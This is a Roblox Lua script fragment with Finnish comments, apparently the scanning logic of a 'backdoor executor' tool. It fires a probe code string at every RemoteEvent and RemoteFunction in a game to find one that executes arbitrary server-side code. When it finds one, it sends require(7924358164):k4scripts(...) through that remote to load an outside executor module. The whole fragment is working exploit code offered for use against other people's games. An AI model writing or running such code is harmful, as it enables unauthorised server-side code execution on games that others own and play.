-- Skannaus logiikka (backdoor.exe tyylillä!)
local backdoorRemote = nil
local scanning = false

local function scanForBackdoor()
    if scanning then return end
    scanning = true
    ProgressLabel.Text = "🔍 Scanning remotes..."
    ScanBtn.Text = "SCANNING..."
    Spinner.Visible = true
    
    -- Pyöritä spinner
    local spin = TweenService:Create(SpinnerImg, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {Rotation = 360})
    spin:Play()
    
    local remotes = {}
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remotes, obj)
        end
    end
    
    local guidToRemote = {}
    local foundConn
    
    foundConn = workspace.ChildAdded:Connect(function(child)
        if child:IsA("StringValue") and child.Name:find("BD_") then
            local guid = child.Name:sub(4)
            backdoorRemote = guidToRemote[guid]
            foundConn:Disconnect()
            spin:Cancel()
            ProgressLabel.Text = "✅ BACKDOOR FOUND! Loading executor..."
            task.wait(1)
            -- Lataa executor backdoorin läpi (k4scripts!)
            if backdoorRemote then
                local execCode = string.format('require(7924358164):k4scripts("%s")', PlayerName)
                if backdoorRemote:IsA("RemoteEvent") then
                    backdoorRemote:FireServer(execCode)
                else
                    backdoorRemote:InvokeServer(execCode)
                end
            end
            task.wait(1)
            MainFrame.Visible = false
            ExecutorFrame.Visible = true
            ProgressLabel.Text = "Executor ready! 🎉"
            scanning = false
        end
    end)
    
    -- Testaa jokainen remote
    for _, remote in ipairs(remotes) do
        local guid = HttpService:GenerateGUID(false):gsub("-", "")
        local dummyCode = string.format('local s=Instance.new("StringValue") s.Name="BD_%s" s.Value="found" s.Parent=workspace', guid)
        guidToRemote[guid] = remote
        if remote:IsA("RemoteEvent") then
            remote:FireServer(dummyCode)
        else
            pcall(remote.InvokeServer, remote, dummyCode)
        end
        task.wait(0.05) -- Ei floodaa
    end
    
    -- Timeout 10s
    task.delay(10, function()
        if scanning then
            foundConn:Disconnect()
            spin:Cancel()
            Spinner.Visible = false
            ProgressLabel.Text = "❌ No backdoor found. Try another game!"
            ScanBtn.Text = "SCAN AGAIN"
            scanning = false
        end
    end)
end

ScanBtn.MouseButton1Click:Connect(scanForBackdoor)

